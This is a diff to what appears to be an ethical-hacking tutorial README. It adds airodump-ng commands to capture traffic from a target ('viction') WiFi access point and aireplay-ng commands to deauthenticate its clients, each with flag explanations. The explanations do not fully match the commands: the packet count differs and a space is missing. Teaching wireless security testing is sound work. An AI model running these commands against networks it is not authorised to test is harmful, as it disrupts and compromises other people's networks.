@@ -135,6 +135,8 @@ A wireless Adapter that supports monitor mode and packet injection
 2. Open Terminal; Check to make sure wireless adapter exist
     ```sh
     sudo ifconfig | grep wlan0
+![image](https://user-images.githubusercontent.com/25991921/126598327-0d9f9c4c-549f-4aa3-836b-9a6ac9509095.png)
+
 
 3. Kill any potential problem processes within Kali Linux virtual machine
     ```sh
@@ -157,3 +159,23 @@ A wireless Adapter that supports monitor mode and packet injection
     sudo airodump-ng wlan0
 
 8. Find target wifi access point to be PWND!
+
+9. Filter packets down to focus on viction wifi access point
+    ```sh
+    airodump-ng -c 11 --bssid CC:E1:D5:30:51:F8-w ~/ethical-hacking/misc/hack-01 wlan0
+
+* airodump-ng : For packet capturing
+* -c : Channel
+* –bssid : MAC address of a wireless access point(WAP).
+* -w : The Directory where you want to save the file(Password File).
+* wlan0 : Name of the interface.
+
+10. Deauthorize client from wifi network
+    ```sh
+    aireplay-ng -0 99 -a CC:E1:D5:30:51:F8 wlan0
+
+* aireplay-ng : To inject frames
+* -0 : For deauthentication
+* 10 : No. of deauthentication packets to be sent
+* -a : For the bssid of the target network
+* wlan0 : Name of the interface. 
